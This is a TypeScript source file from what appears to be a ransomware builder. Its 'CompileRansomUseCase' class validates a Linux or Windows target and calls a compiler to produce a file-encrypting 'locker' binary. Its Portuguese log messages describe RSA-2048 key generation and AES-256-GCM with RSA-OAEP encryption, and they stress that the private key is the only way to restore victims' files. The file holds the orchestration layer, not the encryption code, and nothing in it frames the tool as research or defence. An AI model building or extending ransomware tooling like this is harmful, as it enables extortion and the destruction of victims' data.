import type { IRansomCompiler, RansomSO, RansomBuildResult } from "../../../domain/ports/IRansomCompiler.js";
import { Result } from "../../../shared/Result.js";

const VALID_SO: ReadonlySet<string> = new Set<RansomSO>(["linux", "windows"]);

export class CompileRansomUseCase {
  constructor(private readonly compiler: IRansomCompiler) {}

  async execute(
    so: RansomSO,
    onLog?: (msg: string) => void,
  ): Promise<Result<RansomBuildResult>> {
    if (!VALID_SO.has(so)) {
      return Result.fail(`SO inválido: esperado "linux" ou "windows", recebido "${String(so)}"`);
    }

    const log = (msg: string) => onLog?.(msg);

    log(`[*] Gerando par RSA-2048...`);
    log(`[*] Compilando locker para ${so.toUpperCase()} (AES-256-GCM + RSA-OAEP)...`);

    const result = await this.compiler.compile(so);

    if (result.isFailure) {
      log(`[ERROR] ${result.error}`);
    } else {
      log(`[+] Binário: ${result.value!.binaryPath}`);
      log(`[+] Build ID: ${result.value!.buildId}`);
      log(`[!] Guarde a chave privada RSA — é a única forma de restaurar os arquivos.`);
    }

    return result;
  }
}

